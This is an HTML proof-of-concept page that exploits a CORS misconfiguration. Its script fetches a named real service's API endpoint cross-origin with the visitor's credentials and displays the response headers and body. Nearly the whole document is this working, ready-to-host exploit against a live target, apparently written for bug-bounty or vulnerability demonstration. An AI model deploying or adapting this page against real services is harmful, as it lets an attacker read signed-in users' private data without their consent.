<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>CORS Misconfiguration PoC</title>
  <style>body{font-family:system-ui,Arial;margin:24px} pre{white-space:pre-wrap;border:1px solid #ddd;padding:12px;border-radius:8px}</style>
</head>
<body>
  <h2>CORS Misconfiguration PoC (yourname.github.io)</h2>
  <p>This page fetches a protected API cross-origin with <code>credentials: include</code>.</p>
  <pre id="out">Runningâ€¦</pre>

  <script>
  (async () => {
    const target = "https://p.grabtaxi.com/offers-discovery/v1/campaigns/123?latitude=1&longitude=1";
    try {
      const res  = await fetch(target, { method: "GET", credentials: "include", mode: "cors" });
      const text = await res.text();
      const acaOrigin = res.headers.get("access-control-allow-origin");
      const acac      = res.headers.get("access-control-allow-credentials");
      document.getElementById("out").textContent =
        "Status: " + res.status + "\n" +
        "ACAO: "   + acaOrigin + "\n" +
        "ACAC: "   + acac + "\n\n" +
        text.slice(0, 1000);
    } catch (e) {
      document.getElementById("out").textContent = "Error: " + e + "\n\n(If you see a CORS error, this origin may not be allowed. Try a different allowed origin.)";
    }
  })();
  </script>
</body>
</html>
